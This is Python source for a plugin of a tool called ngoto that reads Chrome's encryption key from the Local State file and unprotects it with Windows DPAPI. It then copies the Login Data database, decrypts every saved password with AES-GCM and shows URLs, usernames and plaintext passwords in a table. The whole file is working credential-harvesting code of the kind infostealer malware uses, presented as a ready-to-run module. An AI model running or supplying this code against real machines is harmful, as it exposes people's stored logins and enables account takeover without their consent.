from ngoto.core.util.plugin import Plugin
from ngoto.core.util.logging import Logging
from ngoto.core.util.interface import output
from rich.table import Table # used in this plugin
from rich.style import Style # used in this plugin

class Plugin(Plugin):
    name = 'Chrome Passwords'
    version = 0.1
    description = 'Get stored chrome passwords'
    req_modules: list = ['win32crypt', 'pycryptodome']
    req_apis: list = []
    logger: Logging = None
    parameters: list = []
    os: list = ['Windows']

    table: Table = None # used in this plugin 
    title_style = Style(color="blue", blink=False, bold=True) # used in this plugin
    border_style = Style(color="black", blink=False, bold=True) # used in this plugin
    header_style = Style(color="black", blink=False, bold=True) # used in this plugin



    def get_chrome_datetime(self, chromedate):
        """Return a `datetime.datetime` object from a chrome format datetime
        Since `chromedate` is formatted as the number of microseconds since January, 1601"""
        from datetime import datetime, timedelta
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

    def get_encryption_key(self):
        import os
        import json
        import base64
        import win32crypt
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        # decode the encryption key from Base64
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # remove DPAPI str
        key = key[5:]
        # return decrypted key that was originally encrypted
        # using a session key derived from current user's logon credentials
        # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(self, password, key):
        from Crypto.Cipher import AES
        import win32crypt
        try:
            # get the initialization vector
            iv = password[3:15]
            password = password[15:]
            # generate cipher
            cipher = AES.new(key, AES.MODE_GCM, iv)
            # decrypt password
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                # not supported
                return ""


    def get_context(self) -> list:
        import shutil
        import os
        import sqlite3
        # get the AES key
        key = self.get_encryption_key()
        # local sqlite Chrome database path
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Google", "Chrome", "User Data", "default", "Login Data")
        # copy the file to another location
        # as the database will be locked if chrome is currently running
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        # connect to the database
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        # `logins` table has the data we need
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        
        class Password:
            def __init__(self, origin_url, action_url, username_value, password_value, date_created, date_last_used):
                self.origin_url = str(origin_url)
                self.action_url = str(action_url)
                self.username_value = str(username_value)
                self.password_value = str(password_value)
                self.date_created = str(date_created)
                self.date_last_used = str(date_last_used)

        passwords = []
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = self.decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]  
            passwords.append(Password(origin_url, action_url, username, password, date_created, date_last_used))      
            # if username or password:
            #     print(f"Origin URL: {origin_url}")
            #     print(f"Action URL: {action_url}")
            #     print(f"Username: {username}")
            #     print(f"Password: {password}")
            # else:
            #     continue
            # if date_created != 86400000000 and date_created:
            #     print(f"Creation date: {str(self.get_chrome_datetime(date_created))}")
            # if date_last_used != 86400000000 and date_last_used:
            #     print(f"Last Used: {str(self.get_chrome_datetime(date_last_used))}")
            # print("="*50)
        cursor.close()
        db.close()
        try:
            # try to remove the copied db file
            os.remove(filename)
        except:
            pass
        return {"passwords": passwords}


    # main function to handle input, then calls and return get_context method
    def main(self, logger):
        self.logger = logger
        logger.info(f'Getting Chrome Passwords', program='Chrome Passwords')
        context = self.get_context()
        logger.info(f'Successfully Got Passwords', program='Chrome Passwords')
        return context

    # given context of information prints information
    def print_info(self, context):
        self.table = Table(title="Ngoto Chrome Passwords Plugin", title_style=self.title_style, border_style = self.border_style)   
        self.table.add_column("Origin URL", style=self.header_style)
        self.table.add_column("Action URL", style=self.header_style)
        self.table.add_column("Username", style=self.header_style)
        self.table.add_column("Password", style=self.header_style)
        self.table.add_column("Creation Date", style=self.header_style)
        self.table.add_column("Last Used", style=self.header_style)
        for password in context["passwords"]:
            self.table.add_row(password.origin_url, password.action_url, password.username_value, password.password_value, password.date_created, password.date_last_used)
        output(self.table)

    # holds sqlite3 create table query to store information
    def create_table(self):
        return ''